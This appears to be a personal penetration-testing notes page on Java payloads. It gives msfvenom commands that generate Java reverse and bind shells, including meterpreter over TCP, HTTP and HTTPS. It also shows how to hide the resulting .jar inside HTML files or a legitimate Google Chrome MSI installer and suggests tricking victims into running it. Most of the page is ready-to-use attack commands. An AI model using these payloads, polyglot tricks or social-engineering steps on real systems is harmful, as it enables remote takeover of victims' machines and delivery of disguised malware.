# Manual

## 01 - Common Files

### 1.1 - Linux

```
/usr/bin/java
/usr/lib/jvm/default/bin/java
/usr/bin/javac
/usr/lib/jvm/default/bin/javac
/usr/bin/jar
/usr/lib/jvm/default/bin/jar
```

^3709e8

### 1.2 - Windows

```
C:\Program Files\Java\jdk-*\bin\java.exe
C:\Program Files\Java\jdk-*\bin\javac.exe
C:\Program Files\Java\jdk-*\bin\javaw.exe
C:\Program Files\Java\jdk-*\bin\jar.exe
```

^028382

## 02 - Generate Payloads

### 2.1 - Reverse Shells

#### 2.1.1 - TCP

Staged reverse shell.

```
$ msfvenom -p java/shell/reverse_tcp lhost=<IP> lport=<PORT> -f raw -o payload.jar
```

Stageless reverse shell.

```
$ msfvenom -p java/shell_reverse_tcp lhost=<IP> lport=<PORT> -f raw -o payload.jar
```

Staged `meterpreter` reverse shell.

```
$ msfvenom -p java/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f raw -o payload.jar
```

#### 2.1.2 - HTTP

Staged reverse shell.

```
$ msfvenom -p java/meterpreter/reverse_http lhost=<IP> lport=<PORT> -f raw -o payload.jar
```

#### 2.1.3 - HTTP via TLS

Staged reverse shell.

```
$ msfvenom -p java/meterpreter/reverse_https handlersslcert=[/path/to/certificate.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -f raw -o payload.jar
```

### 2.2 - Bind Shells

Staged bind shell.

```
$ msfvenom -p java/shell/bind_tcp lport=<PORT> [RHOST=<target_IP>] -f raw -o payload.jar
```

Staged `meterpreter` reverse shell.

```
$ msfvenom -p java/meterpreter/bind_tcp lport=<PORT> [rhost=<target_IP>] -f raw -o payload.jar
```

## 03 - Execute Payloads

> [!TIP]
> On windows, you can combine with a enumeration function to check one of the [[Compilers|compilers]] exist in order to execute the payload especially when the target is windows.
> > [!TIP] Java Payloads
> > You can actually social engineer the victim to double click the `.jar` to establish connection.

```
> java -jar payload.jar
```

## 04 - Polyglot

> [!TIP]
> Feel free to experiment around binding any binary file format with `.jar` payload.

### 4.1 - HTML

Bind the HTML and JAR files together.

```
C:\> copy /y /b filename.html+payload.jar hidden_payload.html
```

Then execute it.

```
C:\> java.exe -jar hidden_payload.html
```

### 4.2 - MSI

Combine with a legitimate installer.

```
C:\> copy /b GoogleChromeStandaloneEnterprise64.msi+payload.jar GoogleChromeStandaloneEnterprise64.jar
```

Then execute it.

```
C:\> java.exe -jar GoogleChromeStandaloneEnterprise64.jar
```

## 05 - Compile After Delivery

> [!INFO]
> Once the source code (`filename.java`) has been compiled. It'll create a class file (`filename.class`) that can be executed with just the `filename`.

^335fe5

```
> javac payload.java

> java payload
```

^3775c1

---
## References

### Source Repositories

- [deepinstinct: JAR-Polyglot-POC](https://github.com/deepinstinct/JAR-Polyglot-POC)

### Tony Lambert

- [Tony Lambert: Making Meterpreter Look Google Signed](https://forensicitguy.github.io/making-meterpreter-look-google-signed/)